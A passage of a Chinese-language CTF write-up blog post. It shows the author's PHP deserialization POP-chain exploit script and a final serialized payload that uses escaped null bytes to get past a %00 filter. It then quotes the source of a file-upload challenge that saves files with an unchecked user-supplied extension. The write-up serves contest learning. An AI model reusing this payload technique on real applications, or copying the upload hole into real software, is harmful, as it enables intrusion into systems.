class="string">&#x27;r3a&#x27;</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;passwd = <span class="string">&#x27;r3b&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rank1</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$r1a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$r1b</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;r1a=<span class="keyword">new</span> <span class="title function_ invoke__">rank3</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;r1b=<span class="string">&#x27;Getflag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rank2</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$r2a</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;r2a = <span class="keyword">new</span> <span class="title function_ invoke__">rank1</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rank4</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$r4a</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;r4a=<span class="keyword">new</span> <span class="title function_ invoke__">rank2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3&lt;---1&lt;---2&lt;---4</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">rank4</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>( <span class="variable">$a</span> ).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// %00如何绕过???</span></span><br><span class="line"><span class="comment">//https://wiki.wgpsec.org/knowledge/ctf/php-serialize.html</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// /00-&gt;%00</span></span><br><span class="line"><span class="comment">// O:5:&quot;rank4&quot;:1:&#123;s:3:&quot;r4a&quot;;O:5:&quot;rank2&quot;:1:&#123;s:3:&quot;r2a&quot;;O:5:&quot;rank1&quot;:2:&#123;s:3:&quot;r1a&quot;;O:5:&quot;rank3&quot;:2:&#123;S:12:&quot;\00rank3\00admin&quot;;s:3:&quot;r3a&quot;;S:9:&quot;\00*\00passwd&quot;;s:3:&quot;r3b&quot;;&#125;s:3:&quot;r1b&quot;;s:7:&quot;Getflag&quot;;&#125;&#125;&#125;</span></span><br><span class="line"><span class="comment">// https://xz.aliyun.com/t/6454?time__1311=n4%2BxnD0DRDB73RDfx05%2BbDyimC0QQDg7iABoD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F</span></span><br></pre></td></tr></table></figure><p>这是我按照pop链的顺序推出来EXP,改在上面,我个人喜欢用<code>__construct()</code>方法传递对象或给参数赋值,网上大部分是那个什么创建完对象后再传来传去.那个<code>-&gt;</code>看得我是又臭又长.个人爱好,勿喷</p><p>这里出题人还给了个恶心你的点<code>if($pass!=null&amp;&amp;!preg_match(&quot;/\x&#123;00&#125;/i&quot;,$pass))</code></p><p>这个正则说人话就是匹配<code>%00</code>.</p><p>为什么会序列化后出现<code>%00</code>,这个你自己去找资料或者是学习一下反序列化漏洞入个门先,别急着就会写题</p><p>我在代码注释后面写了资料~,自己看吧!</p><p>最终Payload:</p><p><code>O:5:&quot;rank4&quot;:1:&#123;s:3:&quot;r4a&quot;;O:5:&quot;rank2&quot;:1:&#123;s:3:&quot;r2a&quot;;O:5:&quot;rank1&quot;:2:&#123;s:3:&quot;r1a&quot;;O:5:&quot;rank3&quot;:2:&#123;S:12:&quot;\00rank3\00admin&quot;;s:3:&quot;r3a&quot;;S:9:&quot;\00*\00passwd&quot;;s:3:&quot;r3b&quot;;&#125;s:3:&quot;r1b&quot;;s:7:&quot;Getflag&quot;;&#125;&#125;&#125;</code></p><blockquote><h4 id="upup">upup</h4></blockquote><p><s>只需要一点小小的审计，详情代码看附件噢</s></p><p>最后一题也算是我这次校赛的遗憾吧,一个是时间太紧张了,没那么多时间用来打CTF,可能也是自己代码审计这块确实low(需要补强)另一个是勾巴服务器有点问题,这个也不怪,之前就一直这种外带和反弹shell的题见的少,每次都觉得留在后面写,后面发现遇到的也多了,再慢慢学吧</p><p>源码先记录下;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Access-Control-Allow-Origin: *&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, Authorization&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Access-Control-Allow-Methods: GET, POST, PUT,DELETE,OPTIONS,PATCH&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Server</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">DS</span> = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$runtime_path</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 初始化</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $config</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$config</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 默认配置</span></span><br><span class="line">        <span class="variable">$default</span> = [</span><br><span class="line">            <span class="string">&#x27;token&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;chunks_path&#x27;</span> =&gt; <span class="string">&#x27;/chunks/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;upload_path&#x27;</span> =&gt; <span class="string">&#x27;/upload/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;min_file_size&#x27;</span> =&gt; <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">        ];</span><br><span class="line">        <span class="comment">// 获取配置信息</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$default</span>,<span class="variable">$config</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 运行目录</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;runtime_path = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getFitSeparator</span>(<span class="keyword">__DIR__</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 构建器</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $config</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">create</span>(<span class="params"><span class="variable">$config</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            (<span class="keyword">new</span> <span class="built_in">self</span>(<span class="variable">$config</span>))-&gt;<span class="title function_ invoke__">start</span>();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (<span class="built_in">Throwable</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getCode</span>() == <span class="number">077</span>)</span><br><span class="line">                <span class="keyword">exit</span>(<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">            <span class="keyword">exit</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">0</span>,<span class="string">&#x27;msg&#x27;</span> =&gt; <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>()]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 运行远程服务器</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// 签名</span></span><br><span class="line">        <span class="variable">$sign</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sign&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$sign</span>))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">returnJson</span>(<span class="number">0</span>,<span class="string">&#x27;数据签名不存在&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">sign_verify</span>(<span class="variable">$_GET</span>,<span class="variable">$sign</span>))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">returnJson</span>(<span class="number">0</span>,<span class="string">&#x27;数据签名验证失败&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">                <span class="comment">// 上传文件</span></span><br><span class="line">                <span class="variable">$info</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">upload_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;uid&#x27;</span>]);</span><br><span class="line">                <span class="comment">// 额外参数</span></span><br><span class="line">                <span class="variable">$info</span>[<span class="string">&#x27;uid&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;uid&#x27;</span>];</span><br><span class="line">                <span class="comment">// 回调通知</span></span><br><span class="line">                <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">upload_notify</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;notify&#x27;</span>],<span class="variable">$info</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">returnJson</span>(<span class="number">1</span>,<span class="string">&#x27;上传文件成功&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 上传文件到服务器</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $uid</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"><span class="variable">$uid</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 获取上传文件</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$file</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">returnJson</span>(<span class="number">0</span>,<span class="string">&#x27;请选择需要上传的文件&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 文件后缀</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>],PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取保存目录</span></span><br><span class="line">        <span class="variable">$save_dir</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getUserUploadPath</span>(<span class="variable">$uid</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取保存文件夹</span></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="string">&#x27;file_&#x27;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRandomName</span>(<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 最终保存路径</span></span><br><span class="line">        <span class="variable">$save_file</span> = <span class="variable language_">$this</span>-&gt;runtime_path . <span class="variable">$save_dir</span> . <span class="variable">$file_name</span> .<span class="string">&#x27;.&#x27;</span>. <span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 保存文件</span></span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$save_file</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_file</span>(<span class="variable">$save_file</span>))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">returnJson</span>(<span class="number">0</span>,<span class="string">&#x27;文件上传失败：Error Move Files&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$save_file</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line">        <span class="variable">$mime_type</span> = <span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>,<span class="variable">$save_file</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 文件信息</span></span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span> =&gt; <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;ext&#x27;</span> =&gt; <span class="variable">$file_ext</span>,</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span> =&gt; <span class="variable">$save_dir</span> . <span class="variable">$file_name</span> .<span class="string">&#x27;.&#x27;</span>. <span class="variable">$file_ext</span>,</span><br><span class="line">            <span class="string">&#x27;size&#x27;</span> =&gt; <span class="variable">$size</span>,</span><br><span class="line">            <span class="string">&#x27;mime&#x27;</span> =&gt; <span class="variable">$mime_type</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取用户上传目录</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $uid</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array|string|string[]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getUserUploadPath</span>(<span class="params"><span class="variable">$uid</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$root</span> = <span class="variable language_">$this</span>-&gt;runtime_path;</span><br><span class="line">        <span class="variable">$path</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getFitSeparator</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;upload_path&#x27;</span>] . <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Ymd&#x27;</span>) . <span class="built_in">self</span>::<span class="variable constant_">DS</span> . <span class="variable">$uid</span> . <span class="built_in">self</span>::<span class="variable constant_">DS</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$save_path</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getFitSeparator</span>(<span class="variable">$root</span>.<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">is_dir</span>(<span class="variable">$save_path</span>) || <span class="title function_ invoke__">mkdir</span>(<span class="variable">$save_path</span>,<span class="number">0775</span>,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$path</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取随机文件名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> int $length</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRandomName</span>(<span class="params"><span class="keyword">int</span> <span class="variable">$length</span> = <span class="number">16</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$charTable</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$charTable</span>[ <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$charTable</span>) - <span class="number">1</span>) ];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取一致化目录分隔符</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $dir</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $ds</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array|string|string[]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFitSeparator</span>(<span class="params"><span class="variable">$dir</span>, <span class="keyword">string</span> <span class="variable">$ds</span> = <span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$ds</span> = <span class="keyword">empty</span>(<span class="variable">$ds</span>) ? <span class="built_in">self</span>::<span class="variable constant_">DS</span> : <span class="variable">$ds</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>([<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;\\\\&#x27;</span>,<span class="string">&#x27;//&#x27;</span>],<span class="variable">$ds</span>,<span class="variable">$dir</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 返回json内容</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $code</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $msg</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $data</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">returnJson</span>(<span class="params"><span class="variable">$code</span>, <span class="variable">$msg</span>, <span class="variable">$data</span> = <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = [</span><br><span class="line">            <span class="string">&#x27;code&#x27;</span> =&gt; <span class="variable">$code</span>,</span><br><span class="line">            <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="variable">$msg</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$result</span>,<span class="variable">$data</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">            <span class="variable">$result</span>[<span class="string">&#x27;data&#x27;</span>] = <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$json</span> = <span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$json</span>,<span class="number">077</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 参数签名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $params</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">sign_params</span>(<span class="params"><span class="variable">$params</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 过滤参数</span></span><br><span class="line">        <span class="variable">$params</span> = <span class="title function_ invoke__">array_filter</span>(<span class="variable">$params</span>,function(<span class="variable">$key</span>) <span class="keyword">use</span> ($<span class="title">params</span>)&#123;</span><br><span class="line">            <span class="title">if</span>(<span class="title">empty</span>($<span class="title">params</span>[$<span class="title">key</span>]) || $<span class="title">key</span> == &#x27;<span class="title">sign</span>&#x27;)&#123;</span><br><span class="line">                <span class="title">return</span> <span class="title">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;,ARRAY_FILTER_USE_KEY);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ascii排序</span></span><br><span class="line">        <span class="title function_ invoke__">ksort</span>(<span class="variable">$params</span>);</span><br><span class="line">        <span class="title function_ invoke__">reset</span>(<span class="variable">$params</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 签名</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">urldecode</span>(<span class="title function_ invoke__">http_build_query</span>(<span class="variable">$params</span>)) . <span class="variable">$this</span>-&gt;config[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 签名验证</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $params</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $sign</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> 